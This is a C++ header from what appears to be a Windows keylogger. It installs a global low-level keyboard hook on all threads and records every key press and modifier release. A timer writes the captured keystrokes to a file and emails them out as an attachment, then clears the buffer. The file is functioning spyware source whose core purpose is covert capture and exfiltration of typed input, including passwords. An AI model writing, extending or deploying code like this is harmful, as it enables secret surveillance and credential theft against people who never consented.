#ifndef KEYBOARDHOOK_H
#define KEYBOARDHOOK_H

#include <iostream>
#include <fstream>
#include <windows.h>
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"

// this will save keys pressed
// its emptied only when keylog is successfully written to a file
std::string keyLog = "";

void timerSendMail() {
    // if keylog is empty we dont have to write anything
    if(keyLog.empty()) {
        return;
    }

    // writeLog() returns the name of the log file created
    std::string lastFile = IO::writeLog(keyLog);

    if(lastFile.empty()) {
        Helper::writeAppLog("Log file creation unsuccessful. Keylog  -  \n" + keyLog + "\n");
        return;
    }

    int x = Mail::sendMail("Log [" + lastFile + "]",
                           "Hi, Please find the log file attached below \n \n\n"
                           "For testing, Log - \n" + keyLog,
                           IO::getOurPath(true) + lastFile);

    if(x != 7) {
        Helper::writeAppLog("Failed to send mail. Error Code : " + Helper::toString(x));
    } else {
        keyLog = "";    // clear keyLog if mail was successfully sent.
    }
}

// create timer that executes timerSendMail every 30 seconds
// for testing, increase time to every hour/day later
Timer mailTimer(timerSendMail, 500*60, Timer::infinite);

HHOOK eHook = NULL;
LRESULT ourKeyboardHookProc(int nCode, WPARAM wparam, LPARAM lparam) {  // procedure for intercpting keyboard events
    if(nCode < 0) {     // if nCode value is less than 0 its not for this hook
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT*) lparam;    // https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagkbdllhookstruct

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
        keyLog += Keys::keys[kbs->vkCode].name;
        if(kbs->vkCode == VK_RETURN) {  // if key pressed was enter, also go  to next line
            keyLog += "\n";
        }
    } else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT || key == VK_LSHIFT ||
           key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL ||
           key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN) {

            std::string keyName = Keys::keys[kbs->vkCode].name;
            keyName.insert(1,"/");   // when a special key is released, we indicate it by putting a '/'
            keyLog += keyName;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}

bool installHook() {

    Helper::writeAppLog("Hook created. Timer Created");
    mailTimer.start(true);
    // https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-setwindowshookexa
    // WH_KEYBOARD_LL : LL stands for low level     // 0 - for all threads
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) ourKeyboardHookProc, GetModuleHandle(NULL), 0);
    return eHook == NULL;
}

bool uninstallHook() {
    BOOL b = UnhookWindowsHookEx(eHook);    // BOOL is windows bool
    eHook = NULL;
    return (bool) b;
}

bool isHooked() {
    return (bool) (eHook == NULL);
}

#endif // KEYBOARDHOOK_H
